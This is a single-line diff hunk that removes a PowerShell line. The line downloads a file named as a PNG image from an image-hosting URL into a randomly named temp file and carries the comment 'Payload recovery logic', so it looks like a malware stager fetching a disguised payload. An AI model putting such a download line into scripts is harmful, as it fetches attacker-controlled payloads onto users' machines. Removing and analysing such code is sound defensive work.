@@ -1,1 +1,0 @@
-$i='https://i.ibb.co/jZwSZRTh/system-log.png';$t="$env:TEMP\$(ni -Path $env:TEMP -ItemType File -Name ([Guid]::NewGuid().ToString() + '.png')).Name";iwr $i -OutFile $t; # Payload recovery logic
